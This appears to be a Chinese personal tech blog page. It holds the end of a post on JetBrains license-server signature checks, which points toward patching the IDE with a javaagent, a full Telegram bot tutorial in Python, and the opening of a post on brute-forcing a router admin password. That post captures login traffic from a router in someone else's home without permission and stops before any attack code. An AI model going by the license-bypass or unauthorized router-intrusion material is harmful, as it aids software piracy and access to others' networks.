<h3 id="如何生成exe文件"><a href="#如何生成exe文件" class="headerlink" title="如何生成exe文件"></a>如何生成exe文件</h3><p>使用<a target="_blank" rel="noopener" href="http://www.pyinstaller.org/">pyinstaller</a>就可以了。</p>
<p>pyinstaller -F demo.py</p>
<h3 id="travis-ci"><a href="#travis-ci" class="headerlink" title="travis-ci"></a>travis-ci</h3><p>我们用travis-ci做持续集成测试，但是travis-ci并不是为了运行程序而准备的。但是我们这个Flask应用还必须得运行才能测试。那咋办呢？<code>subprocess.Popen()</code>？反正各种奇技淫巧都试过了，不好用的。劝大家还是试试<code>app.test_client().get(url).data</code>吧，这样就能获取到响应然后assert了。</p>
<p> </p>
<h2 id="新版JetBrains-License-Server备注"><a href="#新版JetBrains-License-Server备注" class="headerlink" title="新版JetBrains License Server备注"></a>新版JetBrains License Server备注</h2><p>以下内容全文引用自<a target="_blank" rel="noopener" href="http://blog.lanyus.com/archives/174.html/comment-page-21#comments">lanyus</a>评论</p>
<blockquote>
<p>贵站居然没有过滤html的特殊字符？重新发一下吧，以下是原文：</p>
<p>Jetbrains家产品线激活服务器认证从2018.2开始使用两个handler来处理，第一个handler会对老的签名方式进行认证（<!-- abcdef1234567890 --><ObtainTicketResponse></ObtainTicketResponse>类样式），该handler会判断签名是否包含hex之外的字符。如果没有，按老版本方式来验证签名，如果存在hex之外字符则抛异常由自己接住后进入第二个handler来验证。 从版本2018.2.1开始便去掉了第一个handler，改为只由第二个handler来验证，由此老的验证服务器全面失效。 来说说第二个handler的验证逻辑吧： 新的报文返回还是形同：<!-- sign\_body --><xxxResponse></xxxResponse>，其中<xxxResponse></xxxResponse>这样的响应正文中相比较老版本添加<serveruid>xyz</serveruid>配置，这个xyz后文中有用到，不可缺少。 sign_body格式较老版本的hex字符串变动很大，其示例格式如下：SHA1withRSA-xxxxxxxxxxxxxx-yyyyyyyyyyyyyyy，以-符号分隔，SHA1withRSA对应java中签名所使用的算法（可换为MD5withRSA等），xxxxxxxxxxxxxx部分是使用该算法以私钥签名的bin -&gt; base64字符串，yyyyyyyyyyyyyyy部分则是pem格式的证书字符串（可直接放证书正文，不换行）。 其中yyyyyyyyyyyyyyy证书必须由Jetbrains产品内置的一个CN为License Server CA的CA证书签发才有效，而且yyyyyyyyyyyyyyy证书中必须包含CN&#x3D;xyz.lsrv.jetbrains.com(其中xyz对应前文<serveruid>xyz</serveruid>部分所填)。 证书验证通过后才会取出证书中所包含的公钥来验证签名<xxxResponse></xxxResponse>响应正文（和base64Decode(xxxxxxxxxxxxxx)比对），验证通过后继续完成服务器认证（解析正文内容，逻辑同旧版）。 啰啰嗦嗦这么多，总结一下：如果我们想要自己造验证服务器，则需要拿到一张License Server CA签发的证书（包括私钥），而且这个证书被Jetbrains发现可能会被吊销！所以这个恐怕有些痴人说梦了。 对了License Server CA证书的内容由另一张Jetprofile签发的叫prod3y的证书公钥定时校验（数据格式同上文所述，不过正文部分是CA证书字符串），应该是防止被替换吧。 还有类似idea.lanyus.com这样的认证服务器域名黑名单也由这张prod3y证书公钥定时校验，也是怕被篡改吧。如果要替换CA要从替换prod3y证书开始，但那是破解的内容了，不如注册服务器优雅。 就这么多。</p>
</blockquote>
<p> </p>
<p>所以估计License Server这条路可能走不通了，只能通过javaagent这种方法修改客户端（IDE）代码然后达到目的了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/06/jbls/index/" data-id="clhp7rtgw0046s2qrch5q8bdo" data-title="JetBrains License Server原理及40行Python代码的实现" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-tgbot1/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/02/01/tgbot1/index/" class="article-date">
  <time class="dt-published" datetime="2018-02-01T00:00:00.000Z" itemprop="datePublished">2018-02-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/02/01/tgbot1/index/">[Telegram bot 系列]1：requests库、Inline Keyboard、Reply Keyboard与其他细节</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>又到了一年一度写“新年首博”的时候！很高兴，本博客依然坚挺，正努力向着【三周年】庆典一天天地迈进。</p>
<h2 id="关于俺近期的静默"><a href="#关于俺近期的静默" class="headerlink" title="关于俺近期的静默"></a>关于俺近期的静默</h2><p>最近一个多月，俺确实比较忙（在前几篇博文中也多次提及这点），导致博客更新频率下降。在此，先向各位读者表示抱歉 :(</p>
<p>为了避免大伙儿无谓的担心，俺尽量把静默的时间跨度控制在【14天】之内，以表明俺自己是安全的（这是前几年在博客中做的约定）。</p>
<p>上一篇博文是在2017年最后几天发出的，昨天（1月31日）俺特地上博客回复了一些评论——所以这次静默的时间【没有】超过14天。</p>
<h2 id="小土豆机器人课程又开课啦"><a href="#小土豆机器人课程又开课啦" class="headerlink" title="小土豆机器人课程又开课啦"></a>小土豆机器人课程又开课啦</h2><p>自从三个月前发出第一篇<a target="_blank" rel="noopener" href="https://dmesg.app/tgbot0.html">《[Telegram bot 系列]0：用 Python 写一个 Telegram Bot 简单的回话 bot》</a>，这一系列就好像是史上最不受待见的系列一样：没人看，也没有啥想写的欲望，更重要的是也没时间。</p>
<p>于是乎，随着<a target="_blank" rel="noopener" href="https://t.me/bennyblog_bot">ExpressBot</a>越来越好玩，趁着这几天有时间，我决定给这一系列注入新鲜的血液，再次开课水贴，说不定本系列就这么短命的被我在此篇中终结啦♪(^∇^*)。</p>
<h2 id="机器人"><a href="#机器人" class="headerlink" title="机器人"></a>机器人</h2><p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/956079273835560960">几天前</a>被告知我的机器人上了少数派：<a target="_blank" rel="noopener" href="https://sspai.com/post/42967">《查快递、收邮件、订阅 RSS……除了聊天 Telegram 还有这些实用功能》</a>， 然后用户数量大增，导致<a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/956264608561377280">被快递100封IP</a>，然后……这几天抽出来时间，悄悄的给机器人加了一些改进限制。</p>
<h2 id="内联键盘（Inline-Keyboard）与回复键盘（Reply-Keyboard）"><a href="#内联键盘（Inline-Keyboard）与回复键盘（Reply-Keyboard）" class="headerlink" title="内联键盘（Inline Keyboard）与回复键盘（Reply Keyboard）"></a>内联键盘（Inline Keyboard）与回复键盘（Reply Keyboard）</h2><p>用过BotFather的人可能记得，创建机器人的时候我们能看到这样的按钮：</p>
<p><img src="/images/2018020105133426.png"></p>
<p>咱可以通过点击按钮来和服务器进行交互，有些按钮还可以是链接：</p>
<p><img src="/images/2018020105133615.png" alt="https://core.telegram.org/file/811140999/1/2JSoUVlWKa0/4fad2e2743dc8eda04"></p>
<p>上图这种方式我们称之为Inline Keyboard。点击Inline Keyboard的按钮不会造成客户端向机器人发送消息</p>
<p>还有一种与Inline Keyboard比较接近的是custom Reply Keyboard，像下图这样：</p>
<p><img src="/images/2018020105133792.jpeg" alt="https://core.telegram.org/file/811140880/1/jS-YSVkDCNQ/b397dfcefc6da0dc70"></p>
<p>用户点击文本编辑框下面的按钮，客户端就会自动为我们发送对应的消息，实际上Reply Keyboard更像是快捷回复。</p>
<p>这两种keyboard非常适合与用户进行交互（比如说游戏），并且用户不用一次性完整的输入命令、服务端一次性完成解析命令。</p>
<p>观察仔细的小伙伴们可能发现，<a target="_blank" rel="noopener" href="https://t.me/bennyblog_bot">ExpressBot</a> 的查询美剧功能突然变得更好用一些了。</p>
<p><img src="/images/2018020105133848.png"></p>
<h2 id="Reply-Keyboard数据结构及简单示例"><a href="#Reply-Keyboard数据结构及简单示例" class="headerlink" title="Reply Keyboard数据结构及简单示例"></a>Reply Keyboard数据结构及简单示例</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><img src="/images/201802010513382.png"></p>
<p>图片截图自<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#replykeyboardmarkup">Telegram官网</a></p>
<p>我觉得大家都能看懂这是什么意思，那么就写一个简单的Reply Keyboard吧。</p>
<h3 id="简单示例1：Reply-Keyboard"><a href="#简单示例1：Reply-Keyboard" class="headerlink" title="简单示例1：Reply Keyboard"></a>简单示例1：Reply Keyboard</h3><p>为了应用Reply Keyboard，我们需要在send_xyz中给参数reply_markup传递我们自定义的键盘，其中reply_markup必须是ReplyKeyboardMarkup（自定义的键盘）、ReplyKeyboardRemove（移除键盘）或ForceReply（强制用户回复）的实例。</p>
<p>首先我们需要引入types</p>
<p>from telebot import types</p>
<p>之后直接开始写对应命令的代码就可以了：</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def send_welcome(message):<br>    markup &#x3D; types.ReplyKeyboardMarkup(row_width&#x3D;2)<br>    itembtn1 &#x3D; types.KeyboardButton(‘a’)<br>    itembtn2 &#x3D; types.KeyboardButton(‘v’)<br>    itembtn3 &#x3D; types.KeyboardButton(‘d’)<br>    markup.add(itembtn1, itembtn2, itembtn3)<br>    bot.send_message(message.chat.id, “Choose one letter:”, reply_markup&#x3D;markup)</p>
<p>我们先定义了一个markup实例，设置行宽为2，然后添加avd三个按钮，之后在<code>send_message</code>的<code>reply_markup</code>中传递markup实例。如果需要点击一次就隐藏的键盘（但是依旧可以点击按钮显示），那么可以给markup构造时加入<code>one_time_keyboard=True</code>的参数。</p>
<p>[v_blue]关于row_width的注意事项： 对于ReplyKeyboard和下面即将提到的InlineKeyboard来说，如果你的程序是通过循环动态生成的button，并且在循环中迭代调用<code>markup.add(btn)</code>，那么最终只会一个按钮一排。这是因为<code>markup.add(btn1,btn2,btn3)</code>这三个才会被认为一组放到一排，而<code>markup.add(btn)</code>迭代三次会被认为是三组。在这种情况下如果想要遵循row_width的设置，那么需要将按钮append到一个列表里，然后对列表按照row_width进行切片，之后判断执行N个参数的<code>markup.add()</code>。详细的代码可以<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ExpressBot/commit/853b3cec9cc0aa1f2f3b9b362650a4c91fbb4ac3">参考这段commit</a>[&#x2F;v_blue]</p>
<p><img src="/images/2018020105133948.png"></p>
<p>如果我们需要点击按钮分享电话号码、地理位置，那么可以构造按钮的时候加入对应的参数，如 <code>itembtn1 = types.KeyboardButton(&#39;a&#39;, request_contact=True)</code>，此时点击按钮，会有类似如下的提示</p>
<p><img src="/images/201802010513397.png"></p>
<h3 id="简单示例2：ReplyKeyboardRemove"><a href="#简单示例2：ReplyKeyboardRemove" class="headerlink" title="简单示例2：ReplyKeyboardRemove"></a>简单示例2：ReplyKeyboardRemove</h3><p>markup &#x3D; types.ReplyKeyboardRemove(selective&#x3D;False)<br>tb.send_message(chat_id, message, reply_markup&#x3D;markup)</p>
<p>发送这个markup会移除自定义键盘</p>
<h3 id="简单示例3：ForceReply"><a href="#简单示例3：ForceReply" class="headerlink" title="简单示例3：ForceReply"></a>简单示例3：ForceReply</h3><p>ForceReply是强制回复，就好像用户回复机器人的消息一样，使用方法也很简单：</p>
<p>markup &#x3D; types.ForceReply()<br>bot.send_message(message.chat.id, “Choose one letter:”, reply_markup&#x3D;markup)</p>
<p><img src="/images/2018020105134043.png"></p>
<h2 id="Inline-Keyboard之数据结构"><a href="#Inline-Keyboard之数据结构" class="headerlink" title="Inline Keyboard之数据结构"></a>Inline Keyboard之数据结构</h2><p><img src="/images/2018020105134013.png"></p>
<p>我猜大家也都能看懂。InlineKeyboardMarkup的构造比较简单，InlineKeyboardButton的参数要稍微复杂一点，其中比较重要的有：</p>
<ul>
<li>text 按钮上显示的文字</li>
<li>url 点击按钮时打开的url</li>
<li>callback_data 回调数据，1-64字节。</li>
</ul>
<h2 id="Inline-Keyboard之CallbackQuery与answerCallbackQuery"><a href="#Inline-Keyboard之CallbackQuery与answerCallbackQuery" class="headerlink" title="Inline Keyboard之CallbackQuery与answerCallbackQuery"></a>Inline Keyboard之CallbackQuery与answerCallbackQuery</h2><p>由于点击InlineKeyboard时并不是发送常规的命令（&#x2F;start），所以我们需要处理Callback，Telegram使用CallbackQuery来处理此类请求，其数据结构如下：</p>
<p><img src="/images/2018020105134137.png"></p>
<p>其中比较重要的有：</p>
<ul>
<li>id 唯一标识此次按钮点击</li>
<li>message 触发此次callback的消息，其数据结构为Message类型，因此可以使用message.chat.id等方法</li>
<li>data callback_data中的字符串</li>
</ul>
<p>当用户点击按钮时，按钮旁边会显示一个加载中的图标，此时建议使用answerCallbackQuery来给用户提示信息，其数据结构如下所示：</p>
<p><img src="/images/2018020105134239.png"></p>
<h2 id="Inline-Keyboard-及回调简单示例"><a href="#Inline-Keyboard-及回调简单示例" class="headerlink" title="Inline Keyboard 及回调简单示例"></a>Inline Keyboard 及回调简单示例</h2><p>说了那么多数据结构可能会有点懵?，那么还是直接上代码更爽吧~</p>
<p>首先，我们需要像往常一样，创建InlineKeyboard实例，创建键盘实例，然后在send_xyz中把markup发送过去：</p>
<p>markup &#x3D; types.InlineKeyboardMarkup()<br>btn1 &#x3D; types.InlineKeyboardButton(‘Google’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.google.com/ncr">https://www.google.com/ncr</a>‘)<br>btn2 &#x3D; types.InlineKeyboardButton(‘Action’, callback_data&#x3D;’Act Now’)<br>markup.add(btn1,btn2)<br>bot.send_message(message.chat.id, “InlineKeyboard: “, reply_markup&#x3D;markup)</p>
<p>按钮1是打开Google，按钮2需要我们处理回调，可以这么玩：</p>
<p>@bot.callback_query_handler(func&#x3D;lambda call: True)<br>def callback_handle(call):<br>    bot.answer_callback_query(call.id, ‘哎哟’)<br>    bot.send_message(call.message.chat.id, ‘You clicked %s’ % call.data)</p>
<p>把这两段结合起来，运行的话效果大概是酱紫的，我们可以看到回调函数中<code>call.data</code>就是我们在实例化InlineKeyboardButton中参数callback_data所设置的值：</p>
<p><img src="/images/2018020105134342.png"></p>
<p>如果AnswerCallbackQuery开始了showAlert的话，那么会如下弹窗：</p>
<p><img src="/images/2018020105134339.png"></p>
<h2 id="更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）"><a href="#更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）" class="headerlink" title="更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）"></a>更新消息：编辑消息（editMessageText）、删除消息（deleteMessage）与编辑markup（editMessageReplyMarkup）</h2><p>我们知道，Telegram的消息是可以编辑、删除的，机器人也同样可以做到。当然了，reply_markup其实也可以被编辑的，我们就来简单的做一个示例吧。</p>
<p>说到编辑、删除消息，我们只需要chat_id和message_id就可以了，那么编辑、删除大概就可以这么写：</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def edit_message(message):<br>    msg_id &#x3D; bot.send_message(message.chat.id, ‘这里是原始消息’).message_id<br>    time.sleep(2)<br>    # The below comment is wrong!!!<br>    # bot.edit_message_text(‘更新了耶’, chat_id&#x3D;message.chat.id, message_id&#x3D;message.message_id)<br>    bot.edit_message_text(‘更新了耶’, message.chat.id, msg_id)</p>
<p>@bot.message_handler(commands&#x3D;[‘help’])<br>def delete_message(message):<br>    msg_id &#x3D; bot.send_message(message.chat.id, ‘这里是要被删除的消息’).message_id<br>    time.sleep(2)<br>    bot.delete_message(message.chat.id, msg_id)</p>
<p>效果如下图：</p>
<p><img src="/images/2018020105134469.png"></p>
<p>需要注意的是，很多人最开始会想当然的给message_id传递message_id参数，实际上<strong>这是错误的</strong>！如果你这么做，那么你会收到<strong>Bad Request: message can’t be edited</strong>的异常。实际上，你所传递的<strong>message实例是用户发送过来的消息</strong>（包括&#x2F;start &#x2F;help等命令），所以获取到的message_id其实也是用户消息的id，机器人怎么可能编辑用户消息嘛！所以正确的姿势是去找send_message的返回值，通过返回值就可以获取到机器人发送的message_id了。</p>
<p>当然了，另外一种hack可以这么做，只要你确定好你要编辑的消息相对于用户消息的偏移量：</p>
<p>bot.edit_message_text(‘更新了耶’, message.chat.id, message.message_id + 1)</p>
<p>还剩下一种editReplyMessageMarkup，这是用来更新reply_markup的，包括InlineKeyboard和ReplyKeyboard，基本逻辑就是构造新的markup，然后调用，以InlineKeyboard为例：</p>
<p>def edit_reply_markup(message):<br>    markup &#x3D; types.InlineKeyboardMarkup()<br>    btn1 &#x3D; types.InlineKeyboardButton(‘Apple’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.apple.com/">https://www.apple.com</a>‘)<br>    btn2 &#x3D; types.InlineKeyboardButton(‘Microsoft’, url&#x3D;’<a target="_blank" rel="noopener" href="https://www.microsoft.com/">https://www.microsoft.com</a>‘)<br>    markup.add(btn1, btn2)<br>    # use hack<br>    bot.edit_message_reply_markup(message.chat.id, message.message_id - 1, reply_markup&#x3D;markup)</p>
<p>这里引用了message_id计算偏移量，实际上我们有些时候会在callbackQuery中编辑InlineKeyboard，此时可以应用<code>call.message.message_id</code></p>
<p><img src="/images/2018020105134455.png"></p>
<p>详细的API可以<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#updating-messages">参考这里</a></p>
<h2 id="格式化与正在输入的特效"><a href="#格式化与正在输入的特效" class="headerlink" title="格式化与正在输入的特效"></a>格式化与正在输入的特效</h2><p>有些时候，我们想让消息有加粗、斜体等效果，其实这是非常简单的，只需要在send_message时指定parse_mode即可。Telegram支持Markdown与HTML两种模式，具体的信息就<a target="_blank" rel="noopener" href="https://core.telegram.org/bots/api#sendmessage">参考官方文档</a>吧。</p>
<p>如果想加入“正在输入”的特效，那就更简单了，使用send_action就可以了。示例代码如下：</p>
<p>bot.send_chat_action(message.chat.id, ‘typing’)<br>bot.send_message(message.chat.id, ‘这个是_斜体_哦’, parse_mode&#x3D;’Markdown’)<br>bot.send_chat_action(message.chat.id, ‘record_video’)<br>bot.send_message(message.chat.id, “`print(‘hello world’)`“, parse_mode&#x3D;’Markdown’)</p>
<p><img src="/images/2018020105134580.png"></p>
<h2 id="操作数据库"><a href="#操作数据库" class="headerlink" title="操作数据库"></a>操作数据库</h2><p>Python支持很多很多数据库，对于关系型数据库来说，大部分库的设计都是遵循<a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0249/">PEP 249 Python Database API Specification</a>，所以咱的使用往往就是确定用哪种库，更改连接字符串，其他的基本不用改变太多。</p>
<p>Python内建sqlite的支持，所以在机器人这类应用中，用sqlite是非常方便的。</p>
<p>sqlite的使用方法也很简单，基本遵循如下步骤：</p>
<p>import sqlite3</p>
<h1 id="使用内存型数据库，实际应用时应该指定文件路径"><a href="#使用内存型数据库，实际应用时应该指定文件路径" class="headerlink" title="使用内存型数据库，实际应用时应该指定文件路径"></a>使用内存型数据库，实际应用时应该指定文件路径</h1><p>con &#x3D; sqlite3.connect(‘:memory:’)</p>
<h1 id="创建游标"><a href="#创建游标" class="headerlink" title="创建游标"></a>创建游标</h1><p>cur &#x3D; con.cursor()<br>create_table &#x3D; ‘’’CREATE TABLE IF NOT EXISTS job(<br>date DATETIME,<br>done TINYINT)<br>‘’’</p>
<h1 id="执行查询"><a href="#执行查询" class="headerlink" title="执行查询"></a>执行查询</h1><p>cur.execute(create_table)</p>
<h1 id="提交事务，否则不会写入数据库"><a href="#提交事务，否则不会写入数据库" class="headerlink" title="提交事务，否则不会写入数据库"></a>提交事务，否则不会写入数据库</h1><p>con.commit()</p>
<h1 id="关闭连接"><a href="#关闭连接" class="headerlink" title="关闭连接"></a>关闭连接</h1><p>con.close()</p>
<h3 id="防止注入的正确姿势"><a href="#防止注入的正确姿势" class="headerlink" title="防止注入的正确姿势"></a>防止注入的正确姿势</h3><p>首先需要知道的是，拼接SQL命令是不可以的，这样很容易<a target="_blank" rel="noopener" href="https://dmesg.app/school-6.html#title-9">导致注入</a>。：Python不像PHP、Java等存在名为PreparedStatement这类用法，Python防止注入的方法比较奇特，很简单，给<code>cur.execute()</code>传入占位符和参数列表就可以了，具体来说（对于sqlite而言）：</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; ?”, (lumberjack,))</p>
<p>对于MySQL而言，使用%s作为占位符（管他啥类型的数据，数字还是什么的，用%s就对了）</p>
<p>cursor.execute(“SELECT spam FROM eggs WHERE lumberjack &#x3D; %s”, (lumberjack,))</p>
<p>更多详细信息可以参考<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries">StackOverflow: Python best practice and securest to connect to MySQL and execute queries</a></p>
<h2 id="集成requests库并解析json"><a href="#集成requests库并解析json" class="headerlink" title="集成requests库并解析json"></a>集成requests库并解析json</h2><p>Requests 唯一的一个非转基因的 Python HTTP 库，人类可以安全享用。</p>
<p>[v_error]警告：非专业使用其他 HTTP 库会导致危险的副作用，包括：安全缺陷症、冗余代码症、重新发明轮子症、啃文档症、抑郁、头疼、甚至死亡。[&#x2F;v_error]</p>
<p>现如今<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%85%B7%E8%B1%A1%E7%8A%B6%E6%80%81%E4%BC%A0%E8%BE%93">REST API</a>非常流行。REST API说白了就是使用各种HTTP请求（GET，POST，PUT啊什么的），返回某种资源（大部分情况下是json），所以用requests是非常好的选择。</p>
<p>而<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/JSON">json</a>格式与Python的字典基本相同，简直是不要太方便。</p>
<p>requests的使用方法非常简单，差不多就是三行代码的事：</p>
<p>import requests<br>r &#x3D; requests.get(‘<a target="_blank" rel="noopener" href="https://www.google.com/ncr">https://www.google.com/ncr</a>‘)<br>print r.text</p>
<p>如果需要POST方法，就把get换成post，如果需要更改headers等，就写作<code>r = requests.get(&#39;https://www.google.com/ncr&#39;, headers=&#123;&#39;User-Agent&#39;: &#39;Mozilla&#39;, &#125;)</code></p>
<p>更多的高级用法还是参考<a target="_blank" rel="noopener" href="http://docs.python-requests.org/zh_CN/latest/index.html">requests的官方手册</a>吧</p>
<p>不如试试接入淘宝IP库，实现一个查IP地址的机器人吧？（当然了，这只是一段示例代码，其实还是有些bug的啦……）</p>
<p>@bot.message_handler(commands&#x3D;[‘start’])<br>def edit_message(message):<br>    if len(message.text.split(‘ ‘)) !&#x3D; 2:<br>        bot.send_chat_action(message.chat.id, ‘typing’)<br>        bot.send_message(message.chat.id, ‘参数错误’)<br>    else:<br>        location &#x3D; get_location(message.text.split(‘ ‘)[1])<br>        bot.send_chat_action(message.chat.id, ‘typing’)<br>        bot.send_message(message.chat.id, u”你查询的IP地址：`%s`\n%s” % (message.text.split(‘ ‘)[1], location),parse_mode&#x3D;’Markdown’)</p>
<p>def get_location(ip):<br>    r &#x3D; requests.get(‘<a target="_blank" rel="noopener" href="http://ip.taobao.com/service/getIpInfo.php?ip=">http://ip.taobao.com/service/getIpInfo.php?ip=</a>‘ + ip).text<br>    res &#x3D; json.loads(r)<br>    if res.get(‘code’) &#x3D;&#x3D; 0:<br>        return res.get(‘data’).get(‘region’) + res.get(‘data’).get(‘country’) + res.get(‘data’).get(‘isp’)<br>    else:<br>        return ‘请求失败’</p>
<p><img src="/images/2018020105134576.png"></p>
<p>大概就是这么几行……</p>
<p>今天的教程就到这里了。本篇文章涉及到的代码可以在这里获取：</p>
<p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/tools/tree/master/tgbot'/]%E5%BC%80%E6%BA%90%E5%9C%B0%E5%9D%80/[/gt/]">https://github.com/BennyThink/tools/tree/master/tgbot&#39;\]开源地址\[/gt\]</a></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>说太多也难以表达我的心情，可能已经彻底失去希望了吧。</p>
<blockquote>
<p>梁惠王曰：“寡人之于国也，尽心焉耳矣。河内凶，则移其民于河东，移其粟于河内。河东凶亦然。察邻国之政，无如寡人之用心者。邻国之民不加少，寡人之民不加多，何也？”</p>
<p>孟子对曰：“王好战，请以战喻。填然鼓之，兵刃既接，弃甲曳兵而走。或百步而后止，或五十步而后止。以五十步笑百步，则何如？”</p>
<p>曰：“不可，直不百步耳，是亦走也。”</p>
<p>曰：“王如知此，则无望民之多于邻国也。不违农时，谷不可胜食也；数罟不入洿池，鱼鳖不可胜食也；斧斤以时入山林，材木不可胜用也。谷与鱼鳖不可胜食，材木不可胜用，是使民养生丧死无憾也。养生丧死无憾，王道之始也。五亩之宅，树之以桑，五十者可以衣帛矣；鸡豚狗彘之畜，无失其时，七十者可以食肉矣；百亩之田，勿夺其时，数口之家可以无饥矣；谨庠序之教，申之以孝悌之义，颁白者不负戴于道路矣。七十者衣帛食肉，黎民不饥不寒，然而不王者，未之有也。</p>
<p>狗彘食人食而不知检，涂有饿莩而不知发；<strong>人死，则曰：‘非我也，岁也。’是何异于刺人而杀之，曰：‘非我也，兵也。’</strong>王无罪岁，斯天下之民至焉。”</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/02/01/tgbot1/index/" data-id="clhp7rtm3009os2qr2610gaqa" data-title="[Telegram bot 系列]1：requests库、Inline Keyboard、Reply Keyboard与其他细节" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-python-bfa-router/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/12/28/python-bfa-router/index/" class="article-date">
  <time class="dt-published" datetime="2017-12-28T00:00:00.000Z" itemprop="datePublished">2017-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/12/28/python-bfa-router/index/">使用python暴力破解路由器管理密码</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_error]警告：此文可能存在一些破坏性或违反当地法律法规的内容，还可能会玩脱，仅供学习参考，请各位自行斟酌。 另外，如果能够物理接触到路由器，直接抓PPPoE拨号密码就好了[&#x2F;v_error]</p>
<p>自从实习以来，我一直苦恼于一个问题：桥接的房东家路由器，但是一直不知道路由器的管理密码。其实这也不算啥，不知道就不知道呗。直到某一天去某童鞋家，但是就是连不上Wi-Fi，看着挂在墙上的路由器，我就起了邪念……插网线，拿MR12U桥接。但是啊但是啊……咱是不是要进管理里看一下WPA2-PSK究竟是什么！</p>
<p>我目前只遇到了两种类型的路由器，咱就先来爽一把。</p>
<p>工欲善其事，必先利其器。那我们自然要有wireshark，还有postman啊，当然了，没有python解释器也是不行的，啊对你还得有个路由器ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛但是你要是真没有路由器，那就拿Flask写一个简单的REST API吧，也是可以的（但是这还有什么用呢）。</p>
<p>其实在写这篇文章之前，我是很尴尬的……</p>
<p><img src="/images/2017122803165758.png"></p>
<p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/944944017267081217">推特小剧场</a></p>
<h2 id="路由器管理页面登录方式"><a href="#路由器管理页面登录方式" class="headerlink" title="路由器管理页面登录方式"></a>路由器管理页面登录方式</h2><p>我目前见过两种，还有一种就是像openwrt那种……暂时没有环境测试，不玩。</p>
<h3 id="传统型"><a href="#传统型" class="headerlink" title="传统型"></a>传统型</h3><p>大概是这样，需要你输入用户名密码：</p>
<p><img src="/images/2017122803165983.png"></p>
<h3 id="新型"><a href="#新型" class="headerlink" title="新型"></a>新型</h3><p><img src="/images/2017122803170045.png"></p>
<p>我当然是喜欢传统型的啊，为啥，多了个用户名，猜不中用户名有啥用嘛，哈哈哈哈。</p>
<h2 id="抓包之旅：传统型"><a href="#抓包之旅：传统型" class="headerlink" title="抓包之旅：传统型"></a>抓包之旅：传统型</h2><p>所以嘛，什么都不用想，打开wireshark抓包，然后追踪HTTP流，能得到如下的请求报文：</p>
<p>GET &#x2F; HTTP&#x2F;1.1<br>Host: 192.168.7.1<br>Connection: keep-alive<br>Authorization: Basic xxxxx<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;63.0.3075.92 Safari&#x2F;537.36 OPR&#x2F;46.0.2218.234<br>Upgrade-Insecure-Requests: 1<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</p>
<p>DNT: 1<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en-US;q&#x3D;0.8,en;q&#x3D;0.7<br>Cookie: shellInABox&#x3D;3:101010</p>
<p>所以咱们大概是懂了，发现这家伙是登录是get请求带个Authorization的头，内容是Basic base64编码的信息，其中base64编码的是<strong>用户名:密码</strong>，那咱抄起postman就开始……</p>
<p><img src="/images/2017122803170225.png"></p>
<p>既然用postman已经成功登录了，那就没太大问题。</p>
<h2 id="抓包之旅：新型"><a href="#抓包之旅：新型" class="headerlink" title="抓包之旅：新型"></a>抓包之旅：新型</h2><p>这个866N嘛，首先管理页面右键没有用，开控制台发现是JS渲染的，再一看发现不是传统的表单提交的，估计是用的AJAX吧。抓包过滤http的post请求，大概能发现这么奇特的请求：</p>
<p><img src="/images/2017122803170458.png"></p>
<p>看这样子是点击确定按钮之后，用ajax方式提交了一个json。咱在报文上右键，追踪流-HTTP流，看一下完整的响应：</p>
